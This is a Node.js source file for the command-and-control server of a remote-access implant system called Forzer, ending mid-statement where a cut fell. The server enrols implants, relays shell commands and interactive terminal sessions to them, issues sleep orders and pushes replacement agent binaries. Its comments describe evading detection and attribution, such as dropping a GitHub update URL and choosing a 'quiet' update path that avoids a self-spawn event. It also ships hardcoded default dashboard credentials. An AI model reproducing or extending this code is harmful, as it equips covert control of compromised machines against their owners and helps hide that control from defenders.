'use strict';

const http = require('http');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { WebSocketServer } = require('ws');
const identity = require('./identity');
const store = require('./store');
const ops = require('./ops');

const PORT = process.env.PORT || 3000;

// Dashboard credentials. Kept at module scope so the startup warning below can
// see them and so they are read once instead of on every message.
const DASH_USER = process.env.DASH_USER || 'Forgot';
const DASH_PASS = process.env.DASH_PASS || 'HelloWorld1!';

if (process.env.DASH_USER === undefined || process.env.DASH_PASS === undefined) {
  console.warn('[WARN] DASH_USER / DASH_PASS are unset — using the built-in default dashboard credentials.');
}

/* There is no enrolment secret. There used to be a `SETUP_KEY` that a box had
   to present on its first `register`, on the theory that it gated who could
   join the fleet. It gated almost nothing, and it cost a great deal:

   - It was not a command authority, so it protected no implant. A holder could
     add a row to the roster and nothing else.
   - The one thing it did buy — an attacker cannot pass a box off as yours — was
     already bought elsewhere. `forzerctl` refuses an ambiguous name match
     rather than picking one, so a squatter registering your box's hostname
     makes `run DELL24-SEC-036` fail with "matches 2 implants". The attack
     denies you a convenience; it does not impersonate.
   - It was a credential that had to be distributed to every agent and then
     stored in %APPDATA%\Forzer\config.json on each one, so compromising any
     implant compromised the control plane's join capability. Removing it means
     an implant holds no server credential at all — only its own pinned key,
     which is what it needs to prove *it* is itself, and which is useless to
     anyone else.
   - And it was the secret people could not find. An operator who cannot
     retrieve the join key cannot enrol their own box, which is the exact
     failure this is meant to prevent.

   So enrolment is open and the roster is capped instead (see MAX_IMPLANTS).
   The trust boundary is, and always was, the dashboard password: whoever holds
   it can already command every box on the roster, which is strictly more
   powerful than being able to add one. */

/* An open `register` means anyone who can reach this port can add a row, so
   the roster needs a ceiling it did not need when a secret gated the door.
   This bounds an unauthenticated write; it is not an anti-abuse control that
   should be relied on to stop a determined caller, since such a caller can
   simply reconnect. It exists so that a spray cannot grow the database without
   limit and so that a flood is visible in the logs as a refusal. */
const MAX_IMPLANTS = envInt('FORZER_MAX_IMPLANTS', 256, 1, 100000);

/* --- Brute-force throttle ------------------------------------------------
   The dashboard password was previously retryable without limit: one socket
   per guess, and every failure closed that socket and nothing else. Given it
   *is* the trust boundary, that is the difference between a strong secret and
   a timed one. (The counter used to be shared with the enrolment key, which no
   longer exists — so it is now purely a dashboard-password counter.)

   The counters are per remote address, because the answer to "is someone
   guessing at this control plane" should not depend on which connection they
   happen to be guessing on. Success clears the record, so an operator who
   fat-fingers a password twice is not locked out of their own dashboard by the
   third try.

   A note on the address: `x-forwarded-for` is only consulted because this is
   expected to run behind a proxy (Render, a tunnel), where every socket
   arrives from one hop. It is client-controlled, so a caller that can reach
   the port directly can also lie about its address and get a fresh budget per
   frame. That tradeoff is the same one every reverse proxy deployment makes,
   and the alternative — counting only the socket address — locks out every
   agent behind a single NAT. The socket cap below is the part that does not
   depend on the address being true. */
const AUTH_WINDOW_MS = envInt('FORZER_AUTH_WINDOW_MS', 10 * 60 * 1000, 1000, 24 * 3600 * 1000);
const AUTH_MAX_FAILURES = envInt('FORZER_AUTH_MAX_FAILURES', 8, 1, 1000);
const AUTH_BLOCK_MS = envInt('FORZER_AUTH_BLOCK_MS', 15 * 60 * 1000, 1000, 24 * 3600 * 1000);
const AUTH_DEADLINE_MS = envInt('FORZER_AUTH_DEADLINE_MS', 30 * 1000, 1000, 10 * 60 * 1000);
const MAX_UNAUTH_PER_IP = envInt('FORZER_MAX_UNAUTH_PER_IP', 16, 1, 1000);

function envInt(name, dflt, lo, hi) {
  const raw = process.env[name];
  const n = raw === undefined ? NaN : Number.parseInt(raw, 10);
  if (!Number.isFinite(n)) return dflt;
  return Math.min(Math.max(n, lo), hi);
}

/* ip -> { n, first, until }. `until` is when the current block expires. */
const authFailures = new Map();
/* ip -> number of sockets that have connected and not yet authenticated. */
const unauthByIp = new Map();

function clientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) {
    const first = String(fwd).split(',')[0].trim();
    if (first) return first;
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

/* Is this address currently locked out? A blocked address is refused before
   any credential is compared, so the block costs the attacker a TCP connect
   and a WebSocket upgrade rather than a full handshake each time. */
function isBlocked(ip) {
  const rec = authFailures.get(ip);
  if (!rec) return false;
  if (rec.until && rec.until > Date.now()) return true;
  if (rec.until) authFailures.delete(ip);   /* block expired, start clean */
  else if (Date.now() - rec.first > AUTH_WINDOW_MS) authFailures.delete(ip);
  return false;
}

function noteAuthFailure(ip) {
  const now = Date.now();
  let rec = authFailures.get(ip);
  if (!rec || now - rec.first > AUTH_WINDOW_MS) {
    rec = { n: 0, first: now, until: 0 };
    authFailures.set(ip, rec);
  }
  rec.n += 1;
  if (rec.n >= AUTH_MAX_FAILURES) {
    rec.until = now + AUTH_BLOCK_MS;
    console.warn(`[auth] ${ip} locked out after ${rec.n} failed attempts `
      + `(${AUTH_BLOCK_MS / 1000}s)`);
  }
}

function noteAuthSuccess(ip) {
  authFailures.delete(ip);
}

/* Unauthenticated sockets are the other half. A failure record needs a socket
   to happen at all, and a socket that connects and says nothing is free to
   hold — so a socket that has not identified itself within AUTH_DEADLINE_MS is
   closed, and the number of such sockets one address may hold at once is
   capped. The cap counts only *unauthenticated* sockets, so a whole fleet
   behind one NAT address is unaffected once each of them has proved itself. */
function acquireUnauthSlot(ip) {
  const n = unauthByIp.get(ip) || 0;
  if (n >= MAX_UNAUTH_PER_IP) return false;
  unauthByIp.set(ip, n + 1);
  return true;
}

function releaseUnauthSlot(ip) {
  if (!ip) return;
  const n = (unauthByIp.get(ip) || 0) - 1;
  if (n > 0) unauthByIp.set(ip, n);
  else unauthByIp.delete(ip);
}

/* Drop expired records so the maps cannot grow without bound on a long-lived
   process that has seen a lot of addresses. Called from the heartbeat. */
function sweepAuthState() {
  const now = Date.now();
  for (const [ip, rec] of authFailures) {
    if ((rec.until && rec.until <= now) || now - rec.first > AUTH_WINDOW_MS) {
      authFailures.delete(ip);
    }
  }
}

/* Durable implant registry. There is no control-plane keypair to persist: the
   server no longer holds an asymmetric identity, it holds one shared secret
   per implant, and a restart changes nothing. */
const db = store.open();
const registry = new store.Registry(db);

/* Live sockets, keyed by the key-derived implant id. This is connection state
   only; anything that has to survive a restart is in `registry`. */
const implants = new Map(); // implantId -> { id, name, ws }
const viewers = new Map();  // viewerId -> dashboard websocket

function newId() {
  return crypto.randomBytes(8).toString('hex');
}

/* What the operator sees. No address and no topology: there is no overlay, and
   an implant is identified by a key-derived id rather than a network location. */
function implantList() {
  return registry.list().map((i) => {
    const wire = registry.toWire(i);
    const live = implants.get(i.id);
    wire.online = !!live;
    /* Capabilities are a property of the *connection*, not the record: a box
       can be running a build that predates an op, and the same id reconnects
       with a different set. Reading them from the live map means the roster
       always describes the process that is actually on the other end. */
    wire.ops = live ? (live.ops || []) : [];
    wire.proto = live ? (live.proto || 0) : 0;
    return wire;
  });
}

/* Push the current implant list to every connected *viewer*.
   Implants used to be in this loop, and every enrol, reconnect and disconnect
   woke every box on the mesh to receive a document none of them read — the
   agent's own handler for `implants` says it does not parse the payload. On a
   fleet that is a broadcast storm caused by one host rebooting, and it grows
   with the fleet. The roster is an operator view; it goes to operators. */
function broadcastImplants() {
  const payload = JSON.stringify({ type: 'implants', implants: implantList() });
  for (const v of viewers.values()) {
    if (v.readyState === 1) v.send(payload);
  }
}

// --- HTTP surface (health, info, and the web dashboard) ---
let dashboardHtml = '';
try {
  dashboardHtml = fs.readFileSync(path.join(__dirname, 'public', 'dashboard.html'), 'utf8');
} catch (e) {
  dashboardHtml = '<h1>Forzer dashboard not found</h1>';
}

const server = http.createServer((req, res) => {
  // `req.url` is attacker-controlled and `new URL()` throws on some inputs.
  // An uncaught throw inside a 'request' listener takes the process down, so
  // this is a parse-and-guard, not a convenience. Only `pathname` is used, so
  // the base is a constant and the Host header is never reflected back.
  let url;
  try {
    url = new URL(req.url || '/', 'http://localhost');
  } catch {
    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'bad request' }));
    return;
  }
  if (req.method === 'GET' && url.pathname === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true, online: implants.size, total: registry.list().length }));
    return;
  }
  /* The catalog, for a client that wants to know what it may ask for without
     hardcoding the verb list. Same file the server validates against. */
  if (req.method === 'GET' && url.pathname === '/api/ops') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      protocol: ops.protocol(),
      capabilities: ops.capabilities(),
      ops: ops.list(),
      implantOriginated: ops.catalog.implantOriginated || [],
    }));
    return;
  }
  if (url.pathname === '/dashboard' || url.pathname === '/dashboard/') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(dashboardHtml);
    return;
  }
  if (url.pathname === '/' || url.pathname === '/index.html') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      service: 'forzer-control-plane',
      transport: 'websocket',
      note: 'connect via ws:// (or wss:// behind TLS) and send {type:"register",...}',
      dashboard: '/dashboard',
    }));
    return;
  }
  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'not found' }));
});

// --- WebSocket protocol ---
// Two roles and two disjoint rights. A viewer originates work; an implant only
// ever answers. An implant proves possession of a pinned private key on every
// connection, and enrols on that proof alone — there is no join secret.
//
// Implant -> Server:
//   { type: 'register', name, secret }              secret = base64 32 bytes
//   { type: 'auth', proof }                        HMAC over the challenge nonce
//   { type: 'command-result', to, id, data, rc }
//   { type: 'cancel-result',  to, id, rc }
//   { type: 'term-data',    to, id, data, rc }
//   { type: 'term-exit',    to, id, data, rc }
//   { type: 'term-end',     to, id }
// Viewer -> Server:
//   { type: 'dashboard', user, pass }               once, first frame
//   { type: 'command',    to, id, data }
//   { type: 'term-start', to, id }
//   { type: 'term-input', to, id, data }
//   { type: 'term-end',   to, id }
//   { type: 'cancel',     to, id }
//   { type: 'sleep',      to, ms }
//
// Server -> Implant:
//   { type: 'challenge', nonce }                    32 random bytes
//   { type: 'registered', id, serverProof, firstSeen, lastSeen }
//   { type: 'registered', error }                   then the socket closes
//   { type: 'implants', implants: [...] }           operator roster (viewers only)
//   { type: 'command', from, id, data }             from is "viewer:<id>"
//   { type: 'sleep', ms }                           go quiet, then come back
// Server -> Viewer:
//   { type: 'dashboard-ready', id } / { type: 'dashboard-auth', ok, error }
//   { type: 'implants', implants: [...] }
//   { type: 'command-result' | 'term-data' | 'term-exit' | 'term-end', ... }
//   { type: 'command-error', id, to, error }
const wss = new WebSocketServer({ server });

/* Constant-time credential check. `!==` on strings returns as soon as the first
   differing byte is found, which leaks the shared prefix. */
function safeEqualStr(a, b) {
  const x = Buffer.from(String(a == null ? '' : a), 'utf8');
  const y = Buffer.from(String(b == null ? '' : b), 'utf8');
  if (x.length !== y.length) {
    /* timingSafeEqual THROWS unless both buffers are the same length, so a
       dummy built at y.length still mismatches whenever x is shorter. Build
       the dummy at x.length instead: the call then succeeds and burns an
       equivalent amount of work before we report the mismatch. */
    crypto.timingSafeEqual(x, crypto.randomBytes(x.length));
    return false;
  }
  return crypto.timingSafeEqual(x, y);
}

function credsMatch(givenUser, givenPass) {
  return safeEqualStr(givenUser, DASH_USER) & safeEqualStr(givenPass, DASH_PASS);
}

function handleDashboard(ws, msg) {
  if (ws.viewerId) return; // already subscribed
  if (!credsMatch(msg.user, msg.pass)) {
    noteAuthFailure(ws.clientIp || 'unknown');
    ws.send(JSON.stringify({ type: 'dashboard-auth', ok: false,
      error: 'invalid credentials' }));
    /* 1008 rather than a bare close, so this is a policy close like every other
       refusal in the file and shows up as one in a connection log. */
    return ws.close(1008, 'invalid credentials');
  }
  noteAuthSuccess(ws.clientIp || 'unknown');
  markAuthenticated(ws);
  ws.viewerId = newId();
  viewers.set(ws.viewerId, ws);
  ws.send(JSON.stringify({ type: 'dashboard-ready', id: ws.viewerId }));
  ws.send(JSON.stringify({ type: 'implants', implants: implantList() }));
}

/* Called the moment a socket proves what it is. The unauthenticated-socket
   allowance and the handshake deadline both stop counting here: a browser tab
   that has logged in and an implant that has answered its challenge are both
   long-lived by design, and neither should be closed for being slow. */
function markAuthenticated(ws) {
  if (ws.authTimer) {
    clearTimeout(ws.authTimer);
    ws.authTimer = null;
  }
  if (!ws.countedUnauth) return;
  ws.countedUnauth = false;
  releaseUnauthSlot(ws.clientIp);
}

wss.on('connection', (ws, req) => {
  // Throttled before anything else is read off the socket, so a locked-out
  // address never reaches the credential comparison at all.
  ws.clientIp = clientIp(req);
  if (isBlocked(ws.clientIp)) {
    console.warn(`[ws] refused connection from ${ws.clientIp}: locked out`);
    ws.close(1008, 'too many failed authentications');
    return;
  }
  if (!acquireUnauthSlot(ws.clientIp)) {
    console.warn(`[ws] refused connection from ${ws.clientIp}: `
      + `more than ${MAX_UNAUTH_PER_IP} sockets mid-handshake`);
    ws.close(1008, 'too many unauthenticated connections');
    return;
  }
  ws.countedUnauth = true;
  /* A socket that connects and never says anything is still a socket, still a
     file descriptor on this process, and still a per-IP allowance being held.
     The handshake takes two round trips; this is the ceiling on how long a
     connection may occupy one without identifying itself. */
  ws.authTimer = setTimeout(() => {
    if (ws.implantId || ws.viewerId) return;
    console.warn(`[ws] ${ws.clientIp} did not authenticate within `
      + `${AUTH_DEADLINE_MS}ms; closing`);
    try { ws.close(1008, 'handshake timeout'); } catch (_) { /* gone */ }
  }, AUTH_DEADLINE_MS);
  if (ws.authTimer.unref) ws.authTimer.unref();

  // Browsers send an Origin header, the C agent does not. Refusing foreign
  // origins stops any page on the internet from opening a socket to this
  // control plane (its dashboard is served over plain http, so there is no
  // same-origin protection of its own).
  const origin = req.headers.origin;
  if (origin) {
    let ok = false;
    try {
      ok = new URL(origin).host === req.headers.host;
    } catch { ok = false; }
    const allow = (process.env.DASH_ALLOWED_ORIGINS || '')
      .split(',').map((s) => s.trim()).filter(Boolean);
    if (!ok && allow.includes(origin)) ok = true;
    if (!ok) {
      console.warn(`[ws] rejected connection from origin ${origin}`);
      ws.close(1008, 'origin not allowed');
      return;
    }
  }

  // WS-level ping/pong is our heartbeat: a dead socket gets terminated.
  ws.isAlive = true;
  ws.on('pong', () => { ws.isAlive = true; });

  ws.on('message', (raw) => {
    let msg;
    try {
      msg = JSON.parse(raw);
    } catch {
      ws.close();
      return;
    }
    // JSON.parse happily accepts `null`, `5`, `[]` and `"x"`, none of which
    // have a `.type`. Reading it threw an uncaught TypeError and killed the
    // whole process, so a 4-byte frame from an anonymous socket was a full DoS.
    if (!msg || typeof msg !== 'object' || Array.isArray(msg)) {
      ws.close();
      return;
    }
    try {
      if (msg.type === 'register') {
        beginAuth(ws, msg);
      } else if (msg.type === 'auth') {
        finishAuth(ws, msg);
      } else if (msg.type === 'dashboard') {
        handleDashboard(ws, msg);
      } else if (IMPLANT_ROUTABLE.has(msg.type)) {
        if (!ws.implantId) return rejectOrigin(ws, msg.type, 'not an authenticated implant');
        relay(ws, msg);
      } else if (VIEWER_ROUTABLE.has(msg.type)) {
        if (!ws.viewerId) return rejectOrigin(ws, msg.type, 'not authenticated as a viewer');
        /* Validate the verb against the catalog, then against what the target
           actually advertised during its handshake.

           This is the failure the old catch-all used to swallow. A typo in the
           verb and a version-skewed implant both fell through to "ignored",
           which from the operator's side is indistinguishable from an idle box.
           Now the first is `unknown op "..."` with the list, and the second is
           `peer "..." not supported by this implant`. */
        const target = resolveTarget(msg.to);
        const check = ops.requireOp(msg.type, target && target.ops);
        if (!check.ok) {
          console.warn(`[ws] refused '${msg.type}' from viewer ${ws.viewerId} — ${check.error}`);
          return deliver(ws, JSON.stringify({ type: 'command-error', id: msg.id || null,
            to: msg.to, error: check.error }));
        }
        /* Server-side ops are not relayed: they read state the server owns and
           build the frame. Keyed off the catalog's control_plane_only flag. */
        const serverOp = SERVER_OPS.get(msg.type);
        if (serverOp) return serverOp(ws, msg);
        relay(ws, msg);
      } else {
        /* An implant that originated something it may not, or an
           unauthenticated socket, is closed: that is a policy violation and
           it should be loud.

           A *viewer* that sent a type which exists nowhere is a different
           thing entirely - it is a typo in a client, and closing the socket
           turns a mistyped verb into a dropped operator session. That is what
           the old catch-all effectively did: the client saw nothing and the
           operator reconnected, with nothing in the log to explain why.

           A viewer sending an IMPLANT_ROUTABLE type is still a violation, not
           a typo - it would be forging a reply - so that stays a close. */
        if (ws.viewerId && !IMPLANT_ROUTABLE.has(msg.type)) {
          return deliver(ws, JSON.stringify({ type: 'command-error',
            id: msg.id || null, to: msg.to, error: ops.unknownOpError(msg.type) }));
        }
        rejectOrigin(ws, msg.type, null);
      }
    } catch (e) {
      console.error('[ws] message handling failed:', (e && e.message) || e);
      try { ws.close(); } catch (_) { /* already gone */ }
    }
  });

  ws.on('close', () => {
    if (ws.countedUnauth) {
      ws.countedUnauth = false;
      releaseUnauthSlot(ws.clientIp);
    }
    if (ws.implantId && implants.has(ws.implantId)) {
      implants.delete(ws.implantId);
      registry.markOffline(ws.implantId);
      broadcastImplants();
    }
    if (ws.viewerId) {
      viewers.delete(ws.viewerId);
      dropViewerBindings(ws.viewerId);
    }
  });

  ws.on('error', () => {});
});

/* Step 1 of the handshake. The implant presents its enrolled secret; the
   server answers a challenge. Nothing is enrolled here — a socket that never
   completes step 2 is not an implant and gets no entry in `implants`. */
function beginAuth(ws, msg) {
  if (ws.implantId || ws.challenge) return; // already in progress or done

  const secret = identity.parseSecret(msg.secret);
  if (!secret) {
    ws.send(JSON.stringify({ type: 'registered', error: 'secret must be base64 of 32 bytes' }));
    return ws.close(1008, 'malformed secret');
  }

  const secretB64 = secret.toString('base64');
  const name = String(msg.name || 'unnamed').slice(0, 64);
  const known = registry.bySecret(secretB64);

  const nonce = identity.newNonce();
  /* What the implant says it can do, normalised to the catalog's names. An op
     it advertises that the catalog does not define is dropped rather than
     trusted, and so is a repeat: this is attacker-controlled text arriving
     over the wire, and the roster is an operator-facing surface. */
  const advertised = Array.isArray(msg.ops) ? msg.ops : [];
  const knownOps = ops.list().map((o) => o.name);
  const peerOps = [...new Set(advertised.filter((n) => typeof n === 'string' && knownOps.includes(n)))];
  const unknownOps = advertised.filter((n) => typeof n === 'string' && !knownOps.includes(n));
  if (unknownOps.length) {
    console.warn(`[auth] implant ${name} advertised ops not in the catalog: ${unknownOps.join(', ')}`);
  }

  ws.challenge = {
    nonce,
    secret,
    secretB64,
    name,
    proto: Number.isInteger(msg.proto) ? msg.proto : 0,
    peerOps,
    firstSeen: known ? known.firstSeen : null,
    isNew: !known,
  };
  ws.send(JSON.stringify({
    type: 'challenge',
    nonce: nonce.toString('base64'),
  }));
}

/* Step 2. Verify the HMAC over the nonce with the secret the implant enrolled
   with. A wrong proof is indistinguishable from an unknown implant as far as
   the attacker is concerned. */
function finishAuth(ws, msg) {
  const ch = ws.challenge;
  if (!ch || ws.implantId) return; // never issued a challenge, or already done
  ws.challenge = null; // one attempt per challenge

  const secret = ch.secret;

  let given;
  try {
    given = Buffer.from(String(msg.proof || ''), 'base64');
  } catch {
    given = null;
  }
  if (!identity.checkProof(identity.clientProof(secret, ch.nonce), given)) {
    console.warn('[auth] proof rejected');
    noteAuthFailure(ws.clientIp || 'unknown');
    ws.send(JSON.stringify({ type: 'registered', error: 'authentication failed' }));
    return ws.close(1008, 'authentication failed');
  }

  /* Past this line the implant is authenticated. The server proves itself with
     the same secret under a different label, so the agent can refuse to talk
     to anything that is not this control plane — with no stored pin needed,
     because the proof itself can only come from this pairing. */
  let record;
  if (ch.isNew) {
    /* Open enrolment means anyone can add a row, so the roster is capped. A
       returning implant is exempt: refusing a box that is merely re-linking
       would punish an ordinary reconnect for the state of the registry. */
    if (registry.count() >= MAX_IMPLANTS) {
      console.warn(`[auth] refusing a new implant: roster is at its cap of ${MAX_IMPLANTS}`);
      ws.send(JSON.stringify({ type: 'registered', error: `roster is full (${MAX_IMPLANTS} implants)` }));
      return ws.close(1008, 'roster full');
    }
    record = registry.enroll(ch.secretB64, ch.name);
  } else {
    record = registry.byId(identity.implantId(secret));
  }
  const live = registry.markOnline(record.id, ch.name);
  implants.set(live.id, { id: live.id, name: live.name, ws,
    ops: ch.peerOps || [], proto: ch.proto || 0 });
  ws.implantId = live.id;
  noteAuthSuccess(ws.clientIp || 'unknown');
  markAuthenticated(ws);

  ws.send(JSON.stringify({
    type: 'registered',
    id: live.id,
    serverProof: identity.serverProof(secret, ch.nonce).toString('base64'),
    firstSeen: live.firstSeen,
    lastSeen: live.lastSeen,
    new: ch.isNew,
    /* What this peer can do, echoed back so a client that registered on this
       connection has the negotiated view without waiting for a roster push. */
    ops: ch.peerOps || [],
    proto: ch.proto || 0,
  }));
  if (ch.isNew) console.log(`[auth] enrolled implant ${live.id} (${live.name})`);
  broadcastImplants();
}

/* The server is the only thing that can order an implant to do work. Every
   command path is viewer -> server -> implant, so the dashboard credential is
   the trust boundary and the only credential in the system. An implant holds
   no server credential at all: it enrols on its own pinned key and that key
   identifies nothing but itself.

   An implant is reply-only. It may answer a request or stream terminal
   output, and that is the complete list. `command`, `term-start`,
   `term-input` and `signal` are absent deliberately — an implant that
   originated any of them could drive every other implant on the mesh, which
   turned one compromised box into the whole fleet. */
/* The routing sets and the verb vocabulary both come from shared/ops.json now.
   See ops.js: the catalog is validated at load, and an implant is reply-only by
   construction - IMPLANT_ROUTABLE is derived from the catalog's
   `implantOriginated` list, which is exactly the set of types that answer an op
   and originate nothing. An implant that tried to originate `command` would
   have to be added to both lists, and the loader refuses to build a catalog
   where any type appears in both. */
const { VIEWER_ROUTABLE, IMPLANT_ROUTABLE, SERVER_HANDLED } = ops;

/* Server-side op handlers, keyed by wire verb. Built here because
   handleUpdate is declared below the dispatcher. */
const SERVER_OPS = new Map();
SERVER_OPS.set('update', (ws, msg) => handleUpdate(ws, msg));

/* Refuse an impermissible origination loudly rather than dropping it. Silence
   here is what made the old implant-to-implant path invisible: a misconfigured
   client just looked like an idle box. Closing the socket turns it into an
   event in the server log and a visible reconnect loop on the agent. */
function rejectOrigin(ws, type, why) {
  const who = ws.implantId ? `implant ${ws.implantId}` : 'unauthenticated socket';
  console.warn(`[ws] refused '${type}' from ${who}${why ? ` — ${why}` : ''}`);
  try {
    ws.close(1008, 'implant-originated traffic is not permitted');
  } catch (_) { /* already gone */ }
}

// How many request-id -> viewer bindings a single device socket may hold.
// Terminal sessions stay bound until the session ends, so this needs a
// ceiling or a client that opens sessions without closing them leaks.
const MAX_VIEWER_BINDINGS = 256;

/* Which dashboard/MCP session is waiting on a given request or terminal id.
   This used to be a single `ws.commandViewer` field per device socket, which
   meant two overlapping requests from two different viewers overwrote each
   other: one viewer received the other's command output, and the second
   result was dropped entirely. Keyed by id, both are delivered correctly.

   The key is namespaced by the owning viewer, and that is load-bearing rather
   than tidier. Two clients are perfectly entitled to use the same request id —
   every `forzerctl` process numbers its own requests from c1 — and the implant
   echoes back only the id it was given. Keyed on the bare id, the second
   binding overwrote the first and the reply went to whichever session bound
   last: one operator would see another operator's command output, and a
   `cancel` reply could be consumed by the `run` that was waiting on the very
   command being cancelled. The server hands the implant a namespaced id and
   splits it on the way back, so a reply can only ever reach the session that
   asked for it.

   `newId()` is 8 random bytes in hex, so a viewer id can never contain the
   separator, and a client's own id may contain anything: the split is on the
   FIRST separator, not the last. */
function bindKey(viewerId, key) {
  return `${viewerId}:${key}`;
}

function splitBindKey(k) {
  const i = String(k).indexOf(':');
  if (i < 0) return null;
  return { viewerId: k.slice(0, i), key: k.slice(i + 1) };
}

function bindViewer(implantWs, viewerId, key) {
  if (!key) return;
  const k = bindKey(viewerId, key);
  if (!implantWs.viewerBindings) implantWs.viewerBindings = new Map();
  if (implantWs.viewerBindings.has(k)) implantWs.viewerBindings.delete(k);
  implantWs.viewerBindings.set(k, viewerId);
  while (implantWs.viewerBindings.size > MAX_VIEWER_BINDINGS) {
    implantWs.viewerBindings.delete(implantWs.viewerBindings.keys().next().value);
  }
}

/* The implant echoes a namespaced id; the client gets its own back. */
function deliverReply(implantWs, msg) {
  const s = splitBindKey(msg.id);
  if (!s) return;
  const v = viewers.get(s.viewerId);
  if (!v || v.readyState !== 1) return;
  v.send(JSON.stringify({
    type: msg.type,
    from: implantWs.implantId,
    to: msg.to,
    id: s.key,
    data: msg.data === undefined ? null : msg.data,
    rc: typeof msg.rc === 'number' ? msg.rc : undefined,
  }));
}

function unbindViewer(implantWs, key) {
  if (implantWs.viewerBindings && key) implantWs.viewerBindings.delete(key);
}

/* A viewer going away must not leave bindings pointing at a dead socket. */
function dropViewerBindings(viewerId) {
  if (!viewerId) return;
  for (const d of implants.values()) {
    const m = d.ws && d.ws.viewerBindings;
    if (!m) continue;
    for (const [k, v] of m) if (v === viewerId) m.delete(k);
  }
}

/* Resolve a destination implant. An absent `to` used to mean "the first device
   in the map", which silently ran commands on an arbitrary host as soon as a
   second one connected. Only guess when the answer is unambiguous. */
function resolveTarget(to) {
  if (to) return implants.get(String(to)) || null;
  if (implants.size === 1) return implants.values().next().value;
  return null;
}

/* Push a new agent binary to one implant.

   There is deliberately no download URL anywhere in this path. The agent used
   to fetch a build from a hardcoded GitHub raw URL, which put that URL in the
   binary's .rdata and put a request to a well-known third-party domain on the
   wire every time it checked for updates - two independent ways for the
   install to be both found and attributed. Serving the bytes down the channel
   the implant already trusts removes both, and makes updates a push instead
   of a poll.

   The digest is computed here and sent as an announcement; the agent refuses
   anything that does not match, so a truncated or substituted payload is
   discarded before it is staged. */
const UPDATE_MAX_BYTES = 8 * 1024 * 1024;

function handleUpdate(ws, msg) {
  const target = resolveTarget(msg.to);
  if (!target || !target.ws || target.ws.readyState !== 1) {
    return deliver(ws, JSON.stringify({ type: 'command-error', id: msg.id || null,
      to: msg.to, error: targetError(ws, msg.to) }));
  }
  const src = typeof msg.path === 'string' && msg.path ? msg.path
    : path.join(__dirname, '..', 'agent', 'Forzer.exe');

  let buf;
  try {
    const st = fs.statSync(src);
    if (!st.isFile()) throw new Error('not a regular file');
    if (st.size === 0) throw new Error('file is empty');
    if (st.size > UPDATE_MAX_BYTES) throw new Error('larger than the 8 MB ceiling');
    buf = fs.readFileSync(src);
  } catch (e) {
    return deliver(ws, JSON.stringify({ type: 'command-error', id: msg.id || null,
      to: msg.to, error: `cannot read ${src}: ${(e && e.message) || e}` }));
  }

  const sha256 = crypto.createHash('sha256').update(buf).digest('hex');
  const from = 'viewer:' + ws.viewerId;
  /* `restart` selects how the agent applies the new image. 1 = install and
     relaunch this process now (costs a self-spawn event). 0 = install only and
     let the running process continue, so the new image takes effect at the
     next agent start (the logon task). Default 0 is the quiet path. */
  const restart = msg.restart ? 1 : 0;
  deliver(target.ws, JSON.stringify({
    type: 'update', from, to: msg.to, id: msg.id || null, sha256, size: buf.length,
    restart,
  }));
  /* ws.send(Buffer) emits a binary frame. The agent reassembles it, verifies
     the digest, swaps itself and relaunches. */
  target.ws.send(buf, { binary: true });

  deliver(ws, JSON.stringify({ type: 'update-sent', id: msg.id || null,
    to: msg.to, sha256, size: buf.length }));
  console.log(`[update] pushed ${buf.length} bytes to ${msg.to || '(sole implant)'} sha256=${sha256.slice(0, 16)}...`);
}

function targetError(ws, to) {
  return to
    ? 'implant not connected'
    : `no destination: ${implants.size} implants connected, specify one`;
}

function deliver(ws, payload) {
  if (ws && ws.readyState === 1) ws.send(payload);
}

function relay(ws, msg) {
  if (ws.implantId) {
    /* An implant reply goes back to the viewer (or MCP client) that asked for
       it, looked up by request id. This is the only destination an implant
       message can reach: there is no path from here to another implant, so a
       box can talk to its own operator and to nobody else.

       IMPLANT_ROUTABLE is exactly the set of types that earn an echo — the
       dispatcher guarantees nothing else reaches this branch. The lookup is
       keyed on the namespaced id this socket was sent, so an implant still
       cannot inject output into a session bound to a different one, and two
       operators using the same request id no longer overwrite each other. */
    deliverReply(ws, msg);
    if (msg.type === 'command-result' || msg.type === 'term-exit' || msg.type === 'term-end') {
      unbindViewer(ws, msg.id);
    }
    return;
  }
  // A dashboard viewer may only originate commands; the server stamps a
  // synthetic from so the implant can reply, and remembers which viewer to
  // route the result back to. The `from` is the agent's only evidence that a
  // command was ordered by an operator rather than another implant.
  if (ws.viewerId) {
    const target = resolveTarget(msg.to);
    if (!target || !target.ws || target.ws.readyState !== 1) {
      deliver(ws, JSON.stringify({ type: 'command-error', id: msg.id || null,
        to: msg.to, error: targetError(ws, msg.to) }));
      return;
    }
    const from = 'viewer:' + ws.viewerId;
    /* `sleep` is fire-and-forget: nothing comes back, so binding the request id
       would leave an entry in the target's binding table that is never
       released, one per sleep, until the implant disconnects. */
    const wireId = msg.id ? bindKey(ws.viewerId, msg.id) : msg.id;
    if (msg.type !== 'sleep') bindViewer(target.ws, ws.viewerId, msg.id);
    deliver(target.ws, JSON.stringify({
      type: msg.type,
      from,
      to: msg.to,
      id: wireId === undefined ? null : wireId,
      data: msg.data || null,
      ms: typeof msg.ms === 'number' ? Math.max(0, Math.min(msg.ms, 3600000)) : undefined,
    }));
    return;
  }
}

// Heartbeat: terminate sockets that stop answering pings, and drop auth
// bookkeeping that has aged out. Both are periodic cleanups; neither is urgent,
// so they share a timer rather than adding one that fires every 30s.
const heartbeat = setInterval(() => {
  sweepAuthState();
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);

wss.on('close', () => clearInterval(heartbeat));

console.log(`[auth] brute-force throttle: ${AUTH_MAX_FAILURES} failures in `
  + `${AUTH_WINDOW_MS / 1000}s locks an address out for ${AUTH_BLOCK_MS / 1000}s; `
  + `max ${MAX_UNAUTH_PER_IP} sockets mid-handshake per address, `
  + `${AUTH_DEADLINE_MS / 1000}s to authenticate`);

server.listen(PORT, () => {
